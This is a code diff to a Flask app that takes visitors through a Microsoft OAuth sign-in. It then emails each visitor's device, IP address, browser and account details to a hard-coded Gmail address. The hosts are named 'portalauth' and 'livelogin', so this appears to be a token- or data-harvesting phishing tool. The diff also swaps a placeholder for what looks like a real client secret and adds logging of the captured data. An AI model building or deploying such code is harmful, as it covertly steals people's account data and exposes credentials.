@@ -13,7 +13,7 @@ mail = Mail()
 mail.init_app(app)
 
 app.config["DEBUG"] = True
-app.config['SECRET_KEY'] = 'SECRET_KEY'
+app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your Flask secret key
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 465
 app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
@@ -41,13 +41,13 @@ def index():
 
     msal_app = msal.ConfidentialClientApplication(
         client_id,
-        client_credential='YOUR_CLIENT_SECRET',
+        client_credential='k_C8Q~c_Aid9eoKS0xHNZ-EgMOtpHFPNFKufFb6h',
         authority=authority,
     )
 
     auth_url = msal_app.get_authorization_request_url(
         scopes=scope,
-        redirect_uri='https://portalauth.onrender.com/redirect'
+        redirect_uri='https://livelogin-1q94.onrender.com/redirect'
     )
     return redirect(auth_url)
 
@@ -59,7 +59,7 @@ def handle_redirect():
 
     msal_app = msal.ConfidentialClientApplication(
         client_id,
-        client_credential='18b434c6-2462-428a-b265-4e48874c4177',
+        client_credential='k_C8Q~c_Aid9eoKS0xHNZ-EgMOtpHFPNFKufFb6h',
         authority=authority,
     )
 
@@ -68,7 +68,7 @@ def handle_redirect():
         result = msal_app.acquire_token_by_authorization_code(
             code,
             scopes=scope,
-            redirect_uri='https://portalauth.onrender.com/redirect'
+            redirect_uri='https://livelogin-1q94.onrender.com/redirect'
         )
 
         if 'access_token' in result:
@@ -84,6 +84,7 @@ def handle_redirect():
 
             user_info = response.json()
             body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name}\nUser Info: {user_info}"
+            print(body)  # Print the body for debugging purposes
 
             try:
                 with app.app_context():
@@ -95,10 +96,12 @@ def handle_redirect():
                     mail.send(msg)
                 return "Email sent successfully!"
             except Exception as e:
+                print(f"Failed to send email: {str(e)}")  # Print the error for debugging purposes
                 return f"Failed to send email: {str(e)}"
         else:
             error = result.get('error')
             error_description = result.get('error_description')
+            print(f"Error: {error}, Description: {error_description}")  # Print the error for debugging purposes
             return f"Error: {error}, Description: {error_description}"
     else:
         return "Authorization code not found in request."
